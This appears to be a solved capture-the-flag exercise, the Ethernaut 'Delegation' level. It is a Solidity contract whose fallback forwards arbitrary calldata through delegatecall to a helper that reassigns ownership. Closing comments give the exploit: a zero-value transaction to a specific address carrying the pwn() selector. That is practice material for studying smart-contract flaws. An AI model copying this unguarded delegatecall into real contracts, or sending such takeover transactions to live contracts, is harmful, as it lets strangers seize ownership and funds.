// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {

    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
// pwn = web3.keccak(text="pwn()".hex()
// fallback() not payable => send 0
// accounts[0].transfer(to="0xeD8d53b8255b4b595A8dD9c3c33FC6298c99C65f",amount=0,data=pwn, priority_fee="1 gwei")





